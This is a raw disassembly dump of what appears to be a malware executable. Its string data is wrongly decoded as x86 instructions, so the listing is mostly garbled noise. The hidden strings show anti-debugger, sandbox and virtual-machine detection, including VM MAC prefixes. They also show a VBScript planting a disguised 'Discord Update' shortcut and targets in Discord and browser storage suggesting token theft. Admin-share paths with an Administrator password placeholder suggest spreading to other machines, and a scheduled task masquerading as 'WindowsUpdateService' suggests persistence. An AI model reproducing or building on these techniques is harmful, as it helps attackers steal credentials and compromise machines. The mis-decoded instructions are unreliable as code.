  40a14b:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a14f:	76 00                	jbe    0x40a151
  40a151:	00 07                	add    %al,(%edi)
  40a153:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a157:	67 00 00             	add    %al,(%bx,%si)
  40a15a:	21 69 00             	and    %ebp,0x0(%ecx)
  40a15d:	6d                   	insl   (%dx),%es:(%edi)
  40a15e:	00 6d 00             	add    %ch,0x0(%ebp)
  40a161:	75 00                	jne    0x40a163
  40a163:	6e                   	outsb  %ds:(%esi),(%dx)
  40a164:	00 69 00             	add    %ch,0x0(%ecx)
  40a167:	74 00                	je     0x40a169
  40a169:	79 00                	jns    0x40a16b
  40a16b:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a16f:	62 00                	bound  %eax,(%eax)
  40a171:	75 00                	jne    0x40a173
  40a173:	67 00 67 00          	add    %ah,0x0(%bx)
  40a177:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a17b:	00 0f                	add    %cl,(%edi)
  40a17d:	53                   	push   %ebx
  40a17e:	00 62 00             	add    %ah,0x0(%edx)
  40a181:	69 00 65 00 53 00    	imul   $0x530065,(%eax),%eax
  40a187:	76 00                	jbe    0x40a189
  40a189:	63 00                	arpl   %eax,(%eax)
  40a18b:	00 17                	add    %dl,(%edi)
  40a18d:	56                   	push   %esi
  40a18e:	00 42 00             	add    %al,0x0(%edx)
  40a191:	6f                   	outsl  %ds:(%esi),(%dx)
  40a192:	00 78 00             	add    %bh,0x0(%eax)
  40a195:	53                   	push   %ebx
  40a196:	00 65 00             	add    %ah,0x0(%ebp)
  40a199:	72 00                	jb     0x40a19b
  40a19b:	76 00                	jbe    0x40a19d
  40a19d:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40a1a3:	00 11                	add    %dl,(%ecx)
  40a1a5:	76 00                	jbe    0x40a1a7
  40a1a7:	6d                   	insl   (%dx),%es:(%edi)
  40a1a8:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40a1ac:	00 6f 00             	add    %ch,0x0(%edi)
  40a1af:	6c                   	insb   (%dx),%es:(%edi)
  40a1b0:	00 73 00             	add    %dh,0x0(%ebx)
  40a1b3:	64 00 00             	add    %al,%fs:(%eax)
  40a1b6:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40a1bb:	73 00                	jae    0x40a1bd
  40a1bd:	72 00                	jb     0x40a1bf
  40a1bf:	76 00                	jbe    0x40a1c1
  40a1c1:	63 00                	arpl   %eax,(%eax)
  40a1c3:	00 15 78 00 65 00    	add    %dl,0x650078
  40a1c9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1ca:	00 73 00             	add    %dh,0x0(%ebx)
  40a1cd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a1d1:	76 00                	jbe    0x40a1d3
  40a1d3:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40a1d9:	00 0f                	add    %cl,(%edi)
  40a1db:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40a1df:	35 00 73 00 65       	xor    $0x65007300,%eax
  40a1e4:	00 72 00             	add    %dh,0x0(%edx)
  40a1e7:	76 00                	jbe    0x40a1e9
  40a1e9:	00 0d 70 00 72 00    	add    %cl,0x720070
  40a1ef:	6c                   	insb   (%dx),%es:(%edi)
  40a1f0:	00 5f 00             	add    %bl,0x0(%edi)
  40a1f3:	63 00                	arpl   %eax,(%eax)
  40a1f5:	63 00                	arpl   %eax,(%eax)
  40a1f7:	00 13                	add    %dl,(%ebx)
  40a1f9:	70 00                	jo     0x40a1fb
  40a1fb:	72 00                	jb     0x40a1fd
  40a1fd:	6c                   	insb   (%dx),%es:(%edi)
  40a1fe:	00 5f 00             	add    %bl,0x0(%edi)
  40a201:	74 00                	je     0x40a203
  40a203:	6f                   	outsl  %ds:(%esi),(%dx)
  40a204:	00 6f 00             	add    %ch,0x0(%edi)
  40a207:	6c                   	insb   (%dx),%es:(%edi)
  40a208:	00 73 00             	add    %dh,0x0(%ebx)
  40a20b:	00 2b                	add    %ch,(%ebx)
  40a20d:	6d                   	insl   (%dx),%es:(%edi)
  40a20e:	00 69 00             	add    %ch,0x0(%ecx)
  40a211:	63 00                	arpl   %eax,(%eax)
  40a213:	72 00                	jb     0x40a215
  40a215:	6f                   	outsl  %ds:(%esi),(%dx)
  40a216:	00 73 00             	add    %dh,0x0(%ebx)
  40a219:	6f                   	outsl  %ds:(%esi),(%dx)
  40a21a:	00 66 00             	add    %ah,0x0(%esi)
  40a21d:	74 00                	je     0x40a21f
  40a21f:	20 00                	and    %al,(%eax)
  40a221:	63 00                	arpl   %eax,(%eax)
  40a223:	6f                   	outsl  %ds:(%esi),(%dx)
  40a224:	00 72 00             	add    %dh,0x0(%edx)
  40a227:	70 00                	jo     0x40a229
  40a229:	6f                   	outsl  %ds:(%esi),(%dx)
  40a22a:	00 72 00             	add    %dh,0x0(%edx)
  40a22d:	61                   	popa
  40a22e:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a232:	00 6f 00             	add    %ch,0x0(%edi)
  40a235:	6e                   	outsb  %ds:(%esi),(%dx)
  40a236:	00 00                	add    %al,(%eax)
  40a238:	15 76 00 69 00       	adc    $0x690076,%eax
  40a23d:	72 00                	jb     0x40a23f
  40a23f:	74 00                	je     0x40a241
  40a241:	75 00                	jne    0x40a243
  40a243:	61                   	popa
  40a244:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40a248:	00 6f 00             	add    %ch,0x0(%edi)
  40a24b:	78 00                	js     0x40a24d
  40a24d:	00 07                	add    %al,(%edi)
  40a24f:	78 00                	js     0x40a251
  40a251:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a255:	00 13                	add    %dl,(%ebx)
  40a257:	70 00                	jo     0x40a259
  40a259:	61                   	popa
  40a25a:	00 72 00             	add    %dh,0x0(%edx)
  40a25d:	61                   	popa
  40a25e:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a262:	00 65 00             	add    %ah,0x0(%ebp)
  40a265:	6c                   	insb   (%dx),%es:(%edi)
  40a266:	00 73 00             	add    %dh,0x0(%ebx)
  40a269:	00 0b                	add    %cl,(%ebx)
  40a26b:	62 00                	bound  %eax,(%eax)
  40a26d:	68 00 79 00 76       	push   $0x76007900
  40a272:	00 65 00             	add    %ah,0x0(%ebp)
  40a275:	00 07                	add    %al,(%edi)
  40a277:	6b 00 76             	imul   $0x76,(%eax),%eax
  40a27a:	00 6d 00             	add    %ch,0x0(%ebp)
  40a27d:	00 0b                	add    %cl,(%ebx)
  40a27f:	62 00                	bound  %eax,(%eax)
  40a281:	6f                   	outsl  %ds:(%esi),(%dx)
  40a282:	00 63 00             	add    %ah,0x0(%ebx)
  40a285:	68 00 73 00 00       	push   $0x7300
  40a28a:	11 30                	adc    %esi,(%eax)
  40a28c:	00 30                	add    %dh,(%eax)
  40a28e:	00 3a                	add    %bh,(%edx)
  40a290:	00 30                	add    %dh,(%eax)
  40a292:	00 35 00 3a 00 36    	add    %dh,0x36003a00
  40a298:	00 39                	add    %bh,(%ecx)
  40a29a:	00 00                	add    %al,(%eax)
  40a29c:	11 30                	adc    %esi,(%eax)
  40a29e:	00 30                	add    %dh,(%eax)
  40a2a0:	00 3a                	add    %bh,(%edx)
  40a2a2:	00 30                	add    %dh,(%eax)
  40a2a4:	00 43 00             	add    %al,0x0(%ebx)
  40a2a7:	3a 00                	cmp    (%eax),%al
  40a2a9:	32 00                	xor    (%eax),%al
  40a2ab:	39 00                	cmp    %eax,(%eax)
  40a2ad:	00 11                	add    %dl,(%ecx)
  40a2af:	30 00                	xor    %al,(%eax)
  40a2b1:	30 00                	xor    %al,(%eax)
  40a2b3:	3a 00                	cmp    (%eax),%al
  40a2b5:	31 00                	xor    %eax,(%eax)
  40a2b7:	43                   	inc    %ebx
  40a2b8:	00 3a                	add    %bh,(%edx)
  40a2ba:	00 31                	add    %dh,(%ecx)
  40a2bc:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a2bf:	00 11                	add    %dl,(%ecx)
  40a2c1:	30 00                	xor    %al,(%eax)
  40a2c3:	30 00                	xor    %al,(%eax)
  40a2c5:	3a 00                	cmp    (%eax),%al
  40a2c7:	35 00 30 00 3a       	xor    $0x3a003000,%eax
  40a2cc:	00 35 00 36 00 00    	add    %dh,0x3600
  40a2d2:	11 30                	adc    %esi,(%eax)
  40a2d4:	00 38                	add    %bh,(%eax)
  40a2d6:	00 3a                	add    %bh,(%edx)
  40a2d8:	00 30                	add    %dh,(%eax)
  40a2da:	00 30                	add    %dh,(%eax)
  40a2dc:	00 3a                	add    %bh,(%edx)
  40a2de:	00 32                	add    %dh,(%edx)
  40a2e0:	00 37                	add    %dh,(%edi)
  40a2e2:	00 00                	add    %al,(%eax)
  40a2e4:	11 30                	adc    %esi,(%eax)
  40a2e6:	00 41 00             	add    %al,0x0(%ecx)
  40a2e9:	3a 00                	cmp    (%eax),%al
  40a2eb:	30 00                	xor    %al,(%eax)
  40a2ed:	30 00                	xor    %al,(%eax)
  40a2ef:	3a 00                	cmp    (%eax),%al
  40a2f1:	32 00                	xor    (%eax),%al
  40a2f3:	37                   	aaa
  40a2f4:	00 00                	add    %al,(%eax)
  40a2f6:	11 30                	adc    %esi,(%eax)
  40a2f8:	00 30                	add    %dh,(%eax)
  40a2fa:	00 3a                	add    %bh,(%edx)
  40a2fc:	00 30                	add    %dh,(%eax)
  40a2fe:	00 33                	add    %dh,(%ebx)
  40a300:	00 3a                	add    %bh,(%edx)
  40a302:	00 46 00             	add    %al,0x0(%esi)
  40a305:	46                   	inc    %esi
  40a306:	00 00                	add    %al,(%eax)
  40a308:	11 30                	adc    %esi,(%eax)
  40a30a:	00 30                	add    %dh,(%eax)
  40a30c:	00 3a                	add    %bh,(%edx)
  40a30e:	00 31                	add    %dh,(%ecx)
  40a310:	00 35 00 3a 00 35    	add    %dh,0x35003a00
  40a316:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40a31a:	0f 44 00             	cmove  (%eax),%eax
  40a31d:	69 00 73 00 63 00    	imul   $0x630073,(%eax),%eax
  40a323:	6f                   	outsl  %ds:(%esi),(%dx)
  40a324:	00 72 00             	add    %dh,0x0(%edx)
  40a327:	64 00 00             	add    %al,%fs:(%eax)
  40a32a:	25 64 00 69 00       	and    $0x690064,%eax
  40a32f:	73 00                	jae    0x40a331
  40a331:	63 00                	arpl   %eax,(%eax)
  40a333:	6f                   	outsl  %ds:(%esi),(%dx)
  40a334:	00 72 00             	add    %dh,0x0(%edx)
  40a337:	64 00 5f 00          	add    %bl,%fs:0x0(%edi)
  40a33b:	75 00                	jne    0x40a33d
  40a33d:	70 00                	jo     0x40a33f
  40a33f:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a343:	74 00                	je     0x40a345
  40a345:	65 00 2e             	add    %ch,%gs:(%esi)
  40a348:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40a34c:	00 6b 00             	add    %ch,0x0(%ebx)
  40a34f:	00 80 a7 0d 00 0a    	add    %al,0xa000da7(%eax)
  40a355:	00 53 00             	add    %dl,0x0(%ebx)
  40a358:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  40a35d:	00 6f 00             	add    %ch,0x0(%edi)
  40a360:	57                   	push   %edi
  40a361:	00 53 00             	add    %dl,0x0(%ebx)
  40a364:	20 00                	and    %al,(%eax)
  40a366:	3d 00 20 00 57       	cmp    $0x57002000,%eax
  40a36b:	00 53 00             	add    %dl,0x0(%ebx)
  40a36e:	63 00                	arpl   %eax,(%eax)
  40a370:	72 00                	jb     0x40a372
  40a372:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a378:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40a37c:	72 00                	jb     0x40a37e
  40a37e:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a382:	74 00                	je     0x40a384
  40a384:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40a388:	62 00                	bound  %eax,(%eax)
  40a38a:	6a 00                	push   $0x0
  40a38c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a390:	74 00                	je     0x40a392
  40a392:	28 00                	sub    %al,(%eax)
  40a394:	22 00                	and    (%eax),%al
  40a396:	57                   	push   %edi
  40a397:	00 53 00             	add    %dl,0x0(%ebx)
  40a39a:	63 00                	arpl   %eax,(%eax)
  40a39c:	72 00                	jb     0x40a39e
  40a39e:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a3a4:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  40a3a8:	68 00 65 00 6c       	push   $0x6c006500
  40a3ad:	00 6c 00 22          	add    %ch,0x22(%eax,%eax,1)
  40a3b1:	00 29                	add    %ch,(%ecx)
  40a3b3:	00 0d 00 0a 00 53    	add    %cl,0x53000a00
  40a3b9:	00 65 00             	add    %ah,0x0(%ebp)
  40a3bc:	74 00                	je     0x40a3be
  40a3be:	20 00                	and    %al,(%eax)
  40a3c0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3c1:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a3c5:	00 6e 00             	add    %ch,0x0(%esi)
  40a3c8:	6b 00 20             	imul   $0x20,(%eax),%eax
  40a3cb:	00 3d 00 20 00 6f    	add    %bh,0x6f002000
  40a3d1:	00 57 00             	add    %dl,0x0(%edi)
  40a3d4:	53                   	push   %ebx
  40a3d5:	00 2e                	add    %ch,(%esi)
  40a3d7:	00 43 00             	add    %al,0x0(%ebx)
  40a3da:	72 00                	jb     0x40a3dc
  40a3dc:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a3e0:	74 00                	je     0x40a3e2
  40a3e2:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40a3e6:	68 00 6f 00 72       	push   $0x72006f00
  40a3eb:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40a3ef:	00 75 00             	add    %dh,0x0(%ebp)
  40a3f2:	74 00                	je     0x40a3f4
  40a3f4:	28 00                	sub    %al,(%eax)
  40a3f6:	22 00                	and    (%eax),%al
  40a3f8:	00 31                	add    %dh,(%ecx)
  40a3fa:	22 00                	and    (%eax),%al
  40a3fc:	29 00                	sub    %eax,(%eax)
  40a3fe:	0d 00 0a 00 6f       	or     $0x6f000a00,%eax
  40a403:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a407:	00 6e 00             	add    %ch,0x0(%esi)
  40a40a:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a40d:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40a411:	00 72 00             	add    %dh,0x0(%edx)
  40a414:	67 00 65 00          	add    %ah,0x0(%di)
  40a418:	74 00                	je     0x40a41a
  40a41a:	50                   	push   %eax
  40a41b:	00 61 00             	add    %ah,0x0(%ecx)
  40a41e:	74 00                	je     0x40a420
  40a420:	68 00 20 00 3d       	push   $0x3d002000
  40a425:	00 20                	add    %ah,(%eax)
  40a427:	00 22                	add    %ah,(%edx)
  40a429:	00 00                	add    %al,(%eax)
  40a42b:	3b 22                	cmp    (%edx),%esp
  40a42d:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  40a433:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a437:	00 6e 00             	add    %ch,0x0(%esi)
  40a43a:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a43d:	00 57 00             	add    %dl,0x0(%edi)
  40a440:	6f                   	outsl  %ds:(%esi),(%dx)
  40a441:	00 72 00             	add    %dh,0x0(%edx)
  40a444:	6b 00 69             	imul   $0x69,(%eax),%eax
  40a447:	00 6e 00             	add    %ch,0x0(%esi)
  40a44a:	67 00 44 00          	add    %al,0x0(%si)
  40a44e:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  40a454:	63 00                	arpl   %eax,(%eax)
  40a456:	74 00                	je     0x40a458
  40a458:	6f                   	outsl  %ds:(%esi),(%dx)
  40a459:	00 72 00             	add    %dh,0x0(%edx)
  40a45c:	79 00                	jns    0x40a45e
  40a45e:	20 00                	and    %al,(%eax)
  40a460:	3d 00 20 00 22       	cmp    $0x22002000,%eax
  40a465:	00 00                	add    %al,(%eax)
  40a467:	80 99 22 00 0d 00 0a 	sbbb   $0xa,0xd0022(%ecx)
  40a46e:	00 6f 00             	add    %ch,0x0(%edi)
  40a471:	4c                   	dec    %esp
  40a472:	00 69 00             	add    %ch,0x0(%ecx)
  40a475:	6e                   	outsb  %ds:(%esi),(%dx)
  40a476:	00 6b 00             	add    %ch,0x0(%ebx)
  40a479:	2e 00 57 00          	add    %dl,%cs:0x0(%edi)
  40a47d:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40a483:	6f                   	outsl  %ds:(%esi),(%dx)
  40a484:	00 77 00             	add    %dh,0x0(%edi)
  40a487:	53                   	push   %ebx
  40a488:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40a48c:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a490:	00 20                	add    %ah,(%eax)
  40a492:	00 3d 00 20 00 31    	add    %bh,0x31002000
  40a498:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  40a49e:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a4a2:	00 6e 00             	add    %ch,0x0(%esi)
  40a4a5:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a4a8:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40a4ac:	00 73 00             	add    %dh,0x0(%ebx)
  40a4af:	63 00                	arpl   %eax,(%eax)
  40a4b1:	72 00                	jb     0x40a4b3
  40a4b3:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a4b9:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a4bf:	20 00                	and    %al,(%eax)
  40a4c1:	3d 00 20 00 22       	cmp    $0x22002000,%eax
  40a4c6:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a4ca:	00 73 00             	add    %dh,0x0(%ebx)
  40a4cd:	63 00                	arpl   %eax,(%eax)
  40a4cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4d0:	00 72 00             	add    %dh,0x0(%edx)
  40a4d3:	64 00 20             	add    %ah,%fs:(%eax)
  40a4d6:	00 55 00             	add    %dl,0x0(%ebp)
  40a4d9:	70 00                	jo     0x40a4db
  40a4db:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a4df:	74 00                	je     0x40a4e1
  40a4e1:	65 00 22             	add    %ah,%gs:(%edx)
  40a4e4:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  40a4ea:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a4ee:	00 6e 00             	add    %ch,0x0(%esi)
  40a4f1:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a4f4:	00 53 00             	add    %dl,0x0(%ebx)
  40a4f7:	61                   	popa
  40a4f8:	00 76 00             	add    %dh,0x0(%esi)
  40a4fb:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  40a502:	0b 74 00 65          	or     0x65(%eax,%eax,1),%esi
  40a506:	00 6d 00             	add    %ch,0x0(%ebp)
  40a509:	70 00                	jo     0x40a50b
  40a50b:	5f                   	pop    %edi
  40a50c:	00 00                	add    %al,(%eax)
  40a50e:	03 4e 00             	add    0x0(%esi),%ecx
  40a511:	00 09                	add    %cl,(%ecx)
  40a513:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  40a517:	62 00                	bound  %eax,(%eax)
  40a519:	73 00                	jae    0x40a51b
  40a51b:	00 0f                	add    %cl,(%edi)
  40a51d:	77 00                	ja     0x40a51f
  40a51f:	73 00                	jae    0x40a521
  40a521:	63 00                	arpl   %eax,(%eax)
  40a523:	72 00                	jb     0x40a525
  40a525:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a52b:	00 0b                	add    %cl,(%ebx)
  40a52d:	43                   	inc    %ebx
  40a52e:	00 61 00             	add    %ah,0x0(%ecx)
  40a531:	63 00                	arpl   %eax,(%eax)
  40a533:	68 00 65 00 00       	push   $0x6500
  40a538:	1b 43 00             	sbb    0x0(%ebx),%eax
  40a53b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a53c:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a540:	00 20                	add    %ah,(%eax)
  40a542:	00 43 00             	add    %al,0x0(%ebx)
  40a545:	61                   	popa
  40a546:	00 63 00             	add    %ah,0x0(%ebx)
  40a549:	68 00 65 00 5c       	push   $0x5c006500
  40a54e:	00 6a 00             	add    %ch,0x0(%edx)
  40a551:	73 00                	jae    0x40a553
  40a553:	00 13                	add    %dl,(%ebx)
  40a555:	49                   	dec    %ecx
  40a556:	00 6e 00             	add    %ch,0x0(%esi)
  40a559:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a55d:	78 00                	js     0x40a55f
  40a55f:	65 00 64 00 44       	add    %ah,%gs:0x44(%eax,%eax,1)
  40a564:	00 42 00             	add    %al,0x0(%edx)
  40a567:	00 1b                	add    %bl,(%ebx)
  40a569:	4c                   	dec    %esp
  40a56a:	00 6f 00             	add    %ch,0x0(%edi)
  40a56d:	63 00                	arpl   %eax,(%eax)
  40a56f:	61                   	popa
  40a570:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40a574:	00 53 00             	add    %dl,0x0(%ebx)
  40a577:	74 00                	je     0x40a579
  40a579:	6f                   	outsl  %ds:(%esi),(%dx)
  40a57a:	00 72 00             	add    %dh,0x0(%edx)
  40a57d:	61                   	popa
  40a57e:	00 67 00             	add    %ah,0x0(%edi)
  40a581:	65 00 00             	add    %al,%gs:(%eax)
  40a584:	03 2e                	add    (%esi),%ebp
  40a586:	00 00                	add    %al,(%eax)
  40a588:	05 43 00 24 00       	add    $0x240043,%eax
  40a58d:	00 0d 41 00 44 00    	add    %cl,0x440041
  40a593:	4d                   	dec    %ebp
  40a594:	00 49 00             	add    %cl,0x0(%ecx)
  40a597:	4e                   	dec    %esi
  40a598:	00 24 00             	add    %ah,(%eax,%eax,1)
  40a59b:	00 0b                	add    %cl,(%ebx)
  40a59d:	55                   	push   %ebp
  40a59e:	00 73 00             	add    %dh,0x0(%ebx)
  40a5a1:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a5a5:	73 00                	jae    0x40a5a7
  40a5a7:	00 0d 50 00 75 00    	add    %cl,0x750050
  40a5ad:	62 00                	bound  %eax,(%eax)
  40a5af:	6c                   	insb   (%dx),%es:(%edi)
  40a5b0:	00 69 00             	add    %ch,0x0(%ecx)
  40a5b3:	63 00                	arpl   %eax,(%eax)
  40a5b5:	00 13                	add    %dl,(%ebx)
  40a5b7:	44                   	inc    %esp
  40a5b8:	00 6f 00             	add    %ch,0x0(%edi)
  40a5bb:	63 00                	arpl   %eax,(%eax)
  40a5bd:	75 00                	jne    0x40a5bf
  40a5bf:	6d                   	insl   (%dx),%es:(%edi)
  40a5c0:	00 65 00             	add    %ah,0x0(%ebp)
  40a5c3:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5c4:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40a5c8:	00 00                	add    %al,(%eax)
  40a5ca:	13 44 00 6f          	adc    0x6f(%eax,%eax,1),%eax
  40a5ce:	00 77 00             	add    %dh,0x0(%edi)
  40a5d1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5d2:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40a5d6:	00 61 00             	add    %ah,0x0(%ecx)
  40a5d9:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40a5dd:	00 0d 53 00 68 00    	add    %cl,0x680053
  40a5e3:	61                   	popa
  40a5e4:	00 72 00             	add    %dh,0x0(%edx)
  40a5e7:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40a5ec:	09 54 00 65          	or     %edx,0x65(%eax,%eax,1)
  40a5f0:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5f3:	70 00                	jo     0x40a5f5
  40a5f5:	00 09                	add    %cl,(%ecx)
  40a5f7:	49                   	dec    %ecx
  40a5f8:	00 50 00             	add    %dl,0x0(%eax)
  40a5fb:	43                   	inc    %ebx
  40a5fc:	00 24 00             	add    %ah,(%eax,%eax,1)
  40a5ff:	00 43 54             	add    %al,0x54(%ebx)
  40a602:	00 41 00             	add    %al,0x0(%ecx)
  40a605:	52                   	push   %edx
  40a606:	00 47 00             	add    %al,0x0(%edi)
  40a609:	45                   	inc    %ebp
  40a60a:	00 54 00 5f          	add    %dl,0x5f(%eax,%eax,1)
  40a60e:	00 4d 00             	add    %cl,0x0(%ebp)
  40a611:	41                   	inc    %ecx
  40a612:	00 43 00             	add    %al,0x0(%ebx)
  40a615:	48                   	dec    %eax
  40a616:	00 49 00             	add    %cl,0x0(%ecx)
  40a619:	4e                   	dec    %esi
  40a61a:	00 45 00             	add    %al,0x0(%ebp)
  40a61d:	5f                   	pop    %edi
  40a61e:	00 4e 00             	add    %cl,0x0(%esi)
  40a621:	41                   	inc    %ecx
  40a622:	00 4d 00             	add    %cl,0x0(%ebp)
  40a625:	45                   	inc    %ebp
  40a626:	00 5c 00 41          	add    %bl,0x41(%eax,%eax,1)
  40a62a:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40a62e:	00 69 00             	add    %ch,0x0(%ecx)
  40a631:	6e                   	outsb  %ds:(%esi),(%dx)
  40a632:	00 69 00             	add    %ch,0x0(%ecx)
  40a635:	73 00                	jae    0x40a637
  40a637:	74 00                	je     0x40a639
  40a639:	72 00                	jb     0x40a63b
  40a63b:	61                   	popa
  40a63c:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40a640:	00 72 00             	add    %dh,0x0(%edx)
  40a643:	00 19                	add    %bl,(%ecx)
  40a645:	79 00                	jns    0x40a647
  40a647:	6f                   	outsl  %ds:(%esi),(%dx)
  40a648:	00 75 00             	add    %dh,0x0(%ebp)
  40a64b:	72 00                	jb     0x40a64d
  40a64d:	70 00                	jo     0x40a64f
  40a64f:	61                   	popa
  40a650:	00 73 00             	add    %dh,0x0(%ebx)
  40a653:	73 00                	jae    0x40a655
  40a655:	77 00                	ja     0x40a657
  40a657:	6f                   	outsl  %ds:(%esi),(%dx)
  40a658:	00 72 00             	add    %dh,0x0(%edx)
  40a65b:	64 00 00             	add    %al,%fs:(%eax)
  40a65e:	49                   	dec    %ecx
  40a65f:	61                   	popa
  40a660:	00 62 00             	add    %ah,0x0(%edx)
  40a663:	63 00                	arpl   %eax,(%eax)
  40a665:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a669:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40a66d:	68 00 69 00 6a       	push   $0x6a006900
  40a672:	00 6b 00             	add    %ch,0x0(%ebx)
  40a675:	6c                   	insb   (%dx),%es:(%edi)
  40a676:	00 6d 00             	add    %ch,0x0(%ebp)
  40a679:	6e                   	outsb  %ds:(%esi),(%dx)
  40a67a:	00 6f 00             	add    %ch,0x0(%edi)
  40a67d:	70 00                	jo     0x40a67f
  40a67f:	71 00                	jno    0x40a681
  40a681:	72 00                	jb     0x40a683
  40a683:	73 00                	jae    0x40a685
  40a685:	74 00                	je     0x40a687
  40a687:	75 00                	jne    0x40a689
  40a689:	76 00                	jbe    0x40a68b
  40a68b:	77 00                	ja     0x40a68d
  40a68d:	78 00                	js     0x40a68f
  40a68f:	79 00                	jns    0x40a691
  40a691:	7a 00                	jp     0x40a693
  40a693:	30 00                	xor    %al,(%eax)
  40a695:	31 00                	xor    %eax,(%eax)
  40a697:	32 00                	xor    (%eax),%al
  40a699:	33 00                	xor    (%eax),%eax
  40a69b:	34 00                	xor    $0x0,%al
  40a69d:	35 00 36 00 37       	xor    $0x37003600,%eax
  40a6a2:	00 38                	add    %bh,(%eax)
  40a6a4:	00 39                	add    %bh,(%ecx)
  40a6a6:	00 00                	add    %al,(%eax)
  40a6a8:	09 2e                	or     %ebp,(%esi)
  40a6aa:	00 65 00             	add    %ah,0x0(%ebp)
  40a6ad:	78 00                	js     0x40a6af
  40a6af:	65 00 00             	add    %al,%gs:(%eax)
  40a6b2:	29 57 00             	sub    %edx,0x0(%edi)
  40a6b5:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40a6bb:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6bc:	00 77 00             	add    %dh,0x0(%edi)
  40a6bf:	73 00                	jae    0x40a6c1
  40a6c1:	55                   	push   %ebp
  40a6c2:	00 70 00             	add    %dh,0x0(%eax)
  40a6c5:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a6c9:	74 00                	je     0x40a6cb
  40a6cb:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40a6cf:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a6d3:	76 00                	jbe    0x40a6d5
  40a6d5:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40a6db:	00 4b 2f             	add    %cl,0x2f(%ebx)
  40a6de:	00 43 00             	add    %al,0x0(%ebx)
  40a6e1:	72 00                	jb     0x40a6e3
  40a6e3:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a6e7:	74 00                	je     0x40a6e9
  40a6e9:	65 00 20             	add    %ah,%gs:(%eax)
  40a6ec:	00 2f                	add    %ch,(%edi)
  40a6ee:	00 53 00             	add    %dl,0x0(%ebx)
  40a6f1:	43                   	inc    %ebx
  40a6f2:	00 20                	add    %ah,(%eax)
